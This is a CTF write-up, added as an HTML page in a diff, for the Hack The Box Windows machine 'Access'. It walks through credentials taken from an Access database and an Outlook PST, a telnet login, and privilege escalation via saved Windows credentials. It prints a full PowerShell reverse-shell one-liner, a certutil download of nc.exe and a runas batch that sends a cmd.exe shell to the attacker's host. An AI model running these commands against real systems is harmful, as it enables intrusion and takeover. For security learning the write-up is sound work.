@@ -1,0 +1,722 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Access - Hack The Box - hackcommander.io</title>
+<meta name="description" content="This is the writeup for Access, a Windows machine involving some enumeration of an Access DB, an Outlook PST and a priv esc using Windows Credential Manager.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Access - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-access/">
+
+
+  <meta property="og:description" content="This is the writeup for Access, a Windows machine involving some enumeration of an Access DB, an Outlook PST and a priv esc using Windows Credential Manager.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-access/access_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-03-02T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-access/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Access - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iván-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Access - Hack The Box">
+    <meta itemprop="description" content="This is the writeup for Access, a Windows machine involving some enumeration of an Access DB, an Outlook PST and a priv esc using Windows Credential Manager.">
+    <meta itemprop="datePublished" content="March 02, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Access - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-03-02T00:00:00+01:00">March 02, 2019 </time>&emsp;
+          
+          
+        </p>
+        <p>Access was a quick and fun box where we had to look for credentials in an Access database then use the credentials to decrypt a PST file. Kali Linux has some tools that let us read those two file types without having to spin up a Windows VM. The box creator was kind enough to open up telnet so once we got the low privilege user credentials from the mailbox file we could log on and find the administrator credentials in the Windows Credential Manager.</p>
+
+<p><img src="/assets/images/htb-writeup-access/access_logo.png" alt="" /></p>
+
+<h2 id="quick-summary">Quick summary</h2>
+
+<ul>
+  <li>There’s an encrypted zip file on the FTP server along with a .mdb Access DB backup</li>
+  <li>The password for the zip file is contained in the backup file</li>
+  <li>The zip file contains a .PST file with another set of credentials in an email</li>
+  <li>The credentials give access to Windows through the telnet service</li>
+  <li>The Windows administrator credentials are stored in Windows Credentials Manager</li>
+</ul>
+
+<h3 id="toolsblogs-used">Tools/Blogs used</h3>
+
+<ul>
+  <li>mdbtools</li>
+  <li>readpst</li>
+</ul>
+
+<h2 id="detailed-steps">Detailed steps</h2>
+
+<h3 id="portscan">Portscan</h3>
+
+<p>Not many ports open for a Windows box.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~# nmap -F 10.10.10.98
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-09-30 18:24 EDT
+Nmap scan report for access.htb (10.10.10.98)
+Host is up (0.018s latency).
+Not shown: 97 filtered ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+23/tcp open  telnet
+80/tcp open  http
+</code></pre></div></div>
+
+<h4 id="ftp">FTP</h4>
+
+<p>The FTP site allows anonymous access and there’s two interesting files we can download:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">backup.mdb</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Access Control.zip</code></li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Access# ftp 10.10.10.98
+Connected to 10.10.10.98.
+220 Microsoft FTP Service
+Name (10.10.10.98:root): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp&gt; ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-23-18  09:16PM       &lt;DIR&gt;          Backups
+08-24-18  10:00PM       &lt;DIR&gt;          Engineer
+226 Transfer complete.
+ftp&gt; cd Backups
+250 CWD command successful.
+ftp&gt; ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-23-18  09:16PM              5652480 backup.mdb
+226 Transfer complete.
+ftp&gt; type binary
+200 Type set to I.
+ftp&gt; get backup.mdb
+local: backup.mdb remote: backup.mdb
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+5652480 bytes received in 0.94 secs (5.7248 MB/s)
+ftp&gt; cd ..
+250 CWD command successful.
+ftp&gt; cd Engineer
+250 CWD command successful.
+ftp&gt; ls
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+08-24-18  01:16AM                10870 Access Control.zip
+226 Transfer complete.
+ftp&gt; get "Access Control.zip"
+local: Access Control.zip remote: Access Control.zip
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+10870 bytes received in 0.05 secs (200.3631 kB/s)
+</code></pre></div></div>
+
+<h3 id="finding-a-password-in-the-access-database">Finding a password in the Access database</h3>
+
+<p>We can use mdbtools to view the Access database file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Access# mdb-tables -1 backup.mdb | grep -i auth
+auth_group_permissions
+auth_message
+auth_permission
+auth_user
+auth_user_groups
+auth_user_user_permissions
+auth_group
+AUTHDEVICE
+</code></pre></div></div>
+
+<p>We can issue SQL queries with the <code class="language-plaintext highlighter-rouge">mdb-sql</code> tool and look for credentials in the <code class="language-plaintext highlighter-rouge">auth_user</code> table:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Access# mdb-sql -p backup.mdb 
+1 =&gt; select * from auth_user
+2 =&gt; go
+
+id	username	password	Status	last_login	RoleID	Remark
+25	admin	admin	1	08/23/18 21:11:47	26	
+27	engineer	access4u@security	1	08/23/18 21:13:36	26	
+28	backup_admin	admin	1	08/23/18 21:14:02	26	
+3 Rows retrieved
+</code></pre></div></div>
+
+<p>Found the following credentials:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">engineer</code> / <code class="language-plaintext highlighter-rouge">access4u@security</code></li>
+</ul>
+
+<h3 id="finding-credentials-in-pst-file">Finding credentials in PST file</h3>
+
+<p>Unzipping the encrypted zip file with password <code class="language-plaintext highlighter-rouge">access4u@security</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Access# 7z e access.zip 
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i7-2600K CPU @ 3.40GHz (206A7),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 10870 bytes (11 KiB)
+
+Extracting archive: access.zip
+--
+Path = access.zip
+Type = zip
+Physical Size = 10870
+
+    
+Enter password (will not be echoed):
+Everything is Ok         
+
+Size:       271360
+Compressed: 10870
+</code></pre></div></div>
+
+<p>We can read the PST file content with <code class="language-plaintext highlighter-rouge">readpst</code> and it’ll create an mbox file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Access# readpst access.pst
+Opening PST file and indexes...
+Processing Folder "Deleted Items"
+	"Access Control" - 2 items done, 0 items skipped.
+
+root@darkisland:~/hackthebox/Machines/Access# ls -l
+total 5820
+-rw-r--r-- 1 root root    3112 Sep 30 18:36 'Access Control.mbox'
+</code></pre></div></div>
+
+<p>Looking in the mbox file we find an email with another set of credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Access# cat 'Access Control.mbox'
+From "john@megacorp.com" Thu Aug 23 19:44:07 2018
+Status: RO
+From: john@megacorp.com &lt;john@megacorp.com&gt;
+Subject: MegaCorp Access Control System "security" account
+To: 'security@accesscontrolsystems.com'
+[...]
+Hi there,
+
+The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
+
+Regards,
+
+John
+</code></pre></div></div>
+
+<p>Found the following credentials:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">security</code> / <code class="language-plaintext highlighter-rouge">4Cc3ssC0ntr0ller</code></li>
+</ul>
+
+<h3 id="getting-a-shell">Getting a shell</h3>
+
+<p>Telnet is enabled on this box so we can use that last set of credentials and log in to the server:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Access# telnet 10.10.10.98
+Trying 10.10.10.98...
+Connected to 10.10.10.98.
+Escape character is '^]'.
+Welcome to Microsoft Telnet Service 
+
+login: security
+password: 4Cc3ssC0ntr0ller
+
+*===============================================================
+Microsoft Telnet Server.
+*===============================================================
+C:\Users\security&gt;type desktop\user.txt
+ff1f3b&lt;redacted&gt;
+</code></pre></div></div>
+
+<h3 id="priv-esc-with-windows-credentials-manager">Priv esc with Windows Credentials Manager</h3>
+
+<p>Our <code class="language-plaintext highlighter-rouge">security</code> user doesn’t have any useful privileges or group memberships. That telnet shell was pretty slow and buggy. I tried running PowerShell but I wasn’t getting any output from the shell so instead I just spawned a reverse shell with Nishang:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\security&gt;powershell -command "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.23',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listening on [any] 4444 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.98] 49159
+
+PS C:\Users\security&gt; whoami
+access\security
+PS C:\Users\security&gt;
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\security&gt; vaultcmd /list
+Currently loaded vaults:
+	Vault: security's Vault
+	Vault Guid:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}
+	Location: C:\Users\security\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+	Status: Unlocked
+	Visibility: Not hidden
+
+	Vault: Windows Vault
+	Vault Guid:{77BC582B-F0A6-4E15-4E80-61736B6F3B29}
+	Location: C:\Users\security\AppData\Local\Microsoft\Vault
+	Status: Unlocked
+	Visibility: Not hidden
+</code></pre></div></div>
+
+<p>Administrator credentials saved in security user’s vault:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\security&gt; vaultcmd /listcreds:"Windows Vault"
+Credentials in vault: Windows Vault
+
+Credential schema: Windows Domain Password Credential
+Resource: Domain:interactive=ACCESS\Administrator
+Identity: ACCESS\Administrator
+Property (schema element id,value): (100,3)
+</code></pre></div></div>
+
+<p>I tried using <a href="Invoke-WCMDUmp">https://github.com/peewpw/Invoke-WCMDump</a> to retrieve the plaintext credentials but that tool only works for “Generic” type credentials.</p>
+
+<p>So instead I just transferred netcat to the machine and popped a shell this way:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\security&gt; certutil -urlcache -f http://10.10.14.23/nc.exe nc.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo c:\users\security\nc.exe -e cmd.exe 10.10.14.23 4444 &gt; shell.bat
+runas /user:administrator /savecred c:\users\security\shell.bat
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@darkisland:~/hackthebox/Machines/Access# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.98] 49159
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+access\administrator
+
+C:\Windows\system32&gt;type c:\users\administrator\desktop\root.txt
+type c:\users\administrator\desktop\root.txt
+6e1586&lt;redacted&gt;
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#access" class="page__taxonomy-item" rel="tag">access</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#credential-manager" class="page__taxonomy-item" rel="tag">credential manager</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#outlook" class="page__taxonomy-item" rel="tag">outlook</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#telnet" class="page__taxonomy-item" rel="tag">telnet</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-03-02T00:00:00+01:00">March 02, 2019</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-zipper/" class="pagination--pager" title="Zipper - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-ethereal/" class="pagination--pager" title="Ethereal - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
